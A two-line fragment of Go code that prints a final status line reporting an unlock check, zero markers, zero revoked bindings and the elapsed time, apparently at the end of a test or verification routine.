	fmt.Printf("C211S_VERDICT_FINAL SIBLING_DURABLE_UNLOCK_ENSURED markers=0 bindings_revoked=0 elapsed=%ds\n", int(time.Since(started).Seconds()))
}
